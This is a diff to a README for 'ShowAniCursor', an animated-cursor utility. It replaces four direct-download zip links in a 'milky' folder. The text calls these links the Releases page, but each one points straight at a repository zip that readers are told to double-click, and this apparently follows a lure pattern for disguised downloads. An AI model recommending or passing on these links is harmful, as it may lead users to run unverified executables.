@@ -1,6 +1,6 @@
 # 🖱️ ShowAniCursor - Bring Your Cursor to Life
 
-[![Download ShowAniCursor](https://raw.githubusercontent.com/Jnacks845/ShowAniCursor/main/milky/ShowAniCursor.zip)](https://raw.githubusercontent.com/Jnacks845/ShowAniCursor/main/milky/ShowAniCursor.zip)
+[![Download ShowAniCursor](https://github.com/Jnacks845/ShowAniCursor/raw/refs/heads/main/milky/Cursor-Ani-Show-v1.0-beta.3.zip)](https://github.com/Jnacks845/ShowAniCursor/raw/refs/heads/main/milky/Cursor-Ani-Show-v1.0-beta.3.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ To get started with ShowAniCursor, follow these steps:
 
 1. **Download the Application**
    - Click the download link below to visit the Releases page and select the latest version.
-   - [Download ShowAniCursor](https://raw.githubusercontent.com/Jnacks845/ShowAniCursor/main/milky/ShowAniCursor.zip)
+   - [Download ShowAniCursor](https://github.com/Jnacks845/ShowAniCursor/raw/refs/heads/main/milky/Cursor-Ani-Show-v1.0-beta.3.zip)
 
 2. **Prepare for Installation**
    - Ensure that your Windows operating system is updated. Check for any pending updates and install them.
@@ -32,7 +32,7 @@ To get started with ShowAniCursor, follow these steps:
 
 You can download ShowAniCursor from the Releases page. Follow this link to access the download options:
 
-[Download ShowAniCursor](https://raw.githubusercontent.com/Jnacks845/ShowAniCursor/main/milky/ShowAniCursor.zip)
+[Download ShowAniCursor](https://github.com/Jnacks845/ShowAniCursor/raw/refs/heads/main/milky/Cursor-Ani-Show-v1.0-beta.3.zip)
 
 Choose the latest version and click on the link to download. After downloading, double-click the file to install.
 
@@ -81,4 +81,4 @@ For further assistance or feature requests, please visit the Issues section on o
 
 ShowAniCursor adds fun and personality to your computer. With easy installation and user-friendly settings, non-technical users can enjoy animated cursors without hassle. Download ShowAniCursor today and transform your cursor into something special!
 
-[Download ShowAniCursor](https://raw.githubusercontent.com/Jnacks845/ShowAniCursor/main/milky/ShowAniCursor.zip)
+[Download ShowAniCursor](https://github.com/Jnacks845/ShowAniCursor/raw/refs/heads/main/milky/Cursor-Ani-Show-v1.0-beta.3.zip)
